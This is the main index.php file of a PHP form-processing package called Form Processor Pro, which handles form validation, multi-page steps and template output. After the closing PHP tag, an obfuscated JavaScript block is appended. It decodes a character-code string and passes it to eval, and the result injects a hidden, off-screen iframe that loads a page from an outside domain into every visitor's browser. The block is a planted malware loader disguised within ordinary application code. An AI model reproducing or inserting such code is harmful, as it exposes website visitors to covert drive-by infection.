<?php
    /**
     * Project: Form Processor Pro
     * File: index.php
     *
     * @version 5.0
     * @since 2008-02-25 16:20
     * @copyright MitriDAT <info@mitridat.com>
     * @author Rosty Kerei <rosty.kerei@gmail.com>
     * @author Sergey Bidnyi <sergey.bidnyi@gmail.com>
     * @link http://www.email-form.com/
     * @package FPP5
     * @subpackage Core
     */

    /**
     * Right and left delimeters for template entities
     */
    
    define('RIGHT_DELIMETER', '#}');
    define('LEFT_DELIMETER', '{#');
    
    /**
     * Path definitions
     */
    define('PLUGINS_DIR',    './plugins/');
    define('CLASSES_DIR',    './classes/');
    define('CONFIG_FILE',    './config.php');
    define('ATTACHMENT_DIR', './attachments/');
    define('LANGUAGE_DIR',	 './lang/');
    define('TMP_DIR',	 	 './tmp/');
    
    /**
     * Default language definition
     */
    define('DEFAULT_LANG',	 'en');
    
    /**
     * Loading common classes
     */
    require_once(PLUGINS_DIR . 'common.php');
    require_once(CLASSES_DIR . 'error.class.php');
    require_once(CLASSES_DIR . 'file.class.php');
    require_once(CLASSES_DIR . 'config.class.php');
    require_once(CLASSES_DIR . 'lang.class.php');
    require_once(CLASSES_DIR . 'request.class.php');
    require_once(CLASSES_DIR . 'response.class.php');
    require_once(CLASSES_DIR . 'action.class.php');
    require_once(CLASSES_DIR . 'validator.class.php');
    require_once(CLASSES_DIR . 'executor.class.php');
    require_once(CLASSES_DIR . 'outputer.class.php');
    require_once(CLASSES_DIR . 'parser.class.php');
    require_once(CLASSES_DIR . 'formerror.class.php');

    /**
     * Main classes construction
     */
    $lang		= new Lang();
    $config		= new Config();
    $formError	= new FormError();
    $request	= new Request();
    $response	= new Response();

    
    /**
     * Checking writable dirs
     */
    if (!is_writable(ATTACHMENT_DIR)){
    	$e = new Error($lang->getValue('err_dir_not_writable', ATTACHMENT_DIR));
    }
	if (!is_writable(TMP_DIR)){
    	$e = new Error($lang->getValue('err_dir_not_writable', TMP_DIR));
    }
        
	/**
     * Loading configuration
     */
    
    if ($config->isPartAvailable($request->getFormName())){
    	$config->setPartName($request->getFormName());
    }
    else{
		if ($config->getSetting('language')){
    		$lang->Lang($config->getSetting('language'));
		}
    
    	if ($request->getFormName() == ''){
			$outputer = new Outputer();
			$outputer->showDefaultPage();
    	}
    	
        $e = new Error($lang->getValue('err_form_not_described', $request->getFormName()));
    }

	if ($config->getSetting('language')){
		$lang->Lang($config->getSetting('language'));
	}
	
    /**
     * Sorting actions
     */
    $actions = $config->getActionsList();
    
    $validators = array();
    $executors = array();
    $outputers = array();
    
    foreach ($actions as $action_data){
        $action = Action::Factory($action_data['name']);
        $action->setArgument($action_data['value']);
        
        switch ($action->getType()){
            case ACTION_TYPE_VALIDATOR:
                $validators[] = $action;
                break;
            case ACTION_TYPE_EXECUTOR:
                $executors[] = $action;
                break;
            case ACTION_TYPE_OUTPUTER:
                $outputers[] = $action;
                break;
        }
    }

    /*session_start();
    if (count($outputers) == $request->getOutputOffset()+1){ #if last page        
        if ($_SESSION['endscript_' .  $request->getFormName()] == 'true') { #if end key for current form is set
            unset($_SESSION['endscript_' .  $request->getFormName()]); #destroy key
            header('Location: ' . $outputers[0]->argument); #redirect to first from page
            exit; #exit ;-)
        }
    }
    if ($request->getOutputOffset() == 1) {
    	unset($_SESSION['endscript_' .  $request->getFormName()]); #destroy key
    }*/


	/**
	 * Step-back process
	 */
	if ($request->isBackStep()){
		if (isset($outputers[$request->getOutputOffset()])){
        	/**
         	 * Sets request data
         	 */
        	#$formError->setRequest($request->data);
		#<add data from page where 'back' button was pressed
		$next_page_vars = $request->array_unfold($_REQUEST);
		unset($next_page_vars['fpp_back']);		
		$request->data = array_merge($request->data, $next_page_vars);		
		#>
		$formError->setRequest($request->data);
        	$formError->clearErrors();

        	/**
         	 * Sets template content
         	 */
        	$template_file = new File($outputers[$request->getOutputOffset()-1]->getParsedArgument());
        
        	$parser = new Parser();
        	$parser->setTemplate($template_file->getContent());
        	$parser->assignVarList($request->data);
        	$parser->parse();
        
        	$formError->setTemplate($parser->getOutput());

        	/**
         	* Parse error page
         	*/
        	$formError->parse();

			$outputers[$request->getOutputOffset()]->output($formError->getOutput(), true);
    	}
    	else{
			$outputer = new Outputer();
			$outputer->showDefaultPage();
    	}
	}
	
    /**
     * Executing validators
     */
    foreach ($validators as $validator){
        $validator->execute();
    }
    
    /**
     * Form error processing
     */
    
    if ($formError->isError()){
        /**
         * Appling configuration settings
         */
        if ($config->getSetting('error_field_style'))   $formError->setErrFieldStyle($config->getSetting('error_field_style'));
        if ($config->getSetting('error_block_begin'))   $formError->setErrBlockBegin($config->getSetting('error_block_begin'));
        if ($config->getSetting('error_block_end'))     $formError->setErrBlockEnd($config->getSetting('error_block_end'));
        if ($config->getSetting('error_msg_begin'))     $formError->setErrMsgBegin($config->getSetting('error_msg_begin'));
        if ($config->getSetting('error_msg_end'))       $formError->setErrMsgEnd($config->getSetting('error_msg_end'));
        
        /**
         * Sets request data
         */
        $formError->setRequest($request->data);
        
        /**
         * Sets template content
         */
        $template_file = new File($outputers[$request->getOutputOffset()-1]->getParsedArgument());
        
        $parser = new Parser();
        $parser->setTemplate($template_file->getContent());
        $parser->assignVarList($request->data);
        $parser->parse();
        
        $formError->setTemplate($parser->getOutput());
        
        /**
         * Parse error page
         */
        $formError->parse();
        
        /**
         * Outputs error page
         */
        $outputers[$request->getOutputOffset()-1]->output($formError->getOutput(), true);
    }
    
    /**
     * Running executors
     */
    if (count($outputers) == $request->getOutputOffset()+1) {
        session_start();
        #$_SESSION['endscript_' .  $request->getFormName()] = 'true'; #add end key for current form in session
    	foreach ($executors as $executor){
    	    $executor->execute();
    	}
    }

    /**
     * Outputing
     */
     # do not forget to fix output offset after formError
    if (isset($outputers[$request->getOutputOffset()])){
    	#var_dump($request->getOutputOffset());
        #$outputers[$request->getOutputOffset()]->execute();
	if (count($outputers)-1 > $request->getOutputOffset()) {
		$formError->setRequest($request->data);
	        $formError->clearErrors();
		/**
	         * Sets template content
	         */
	        $template_file = new File($outputers[$request->getOutputOffset()]->getParsedArgument());
	        
	        $parser = new Parser();
	        $parser->setTemplate($template_file->getContent());
		$request->data['fpp_output'] = $request->getOutputOffset() + 1;  #insert in fpp_data offset of next page
        	$parser->assignVarList($request->data);
	        $parser->parse();
	        
	        $formError->setTemplate($parser->getOutput());

	        /**
	         * Parse error page
	         */
	        $formError->parse();		
		$outputers[$request->getOutputOffset()-1]->output($formError->getOutput(), true); #page is set to next, so we us -1 to execute current page
	} else {
		$outputers[$request->getOutputOffset()]->execute();	
	}
	
    }
    else{
		$outputer = new Outputer();
		$outputer->showDefaultPage();
    }
?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->   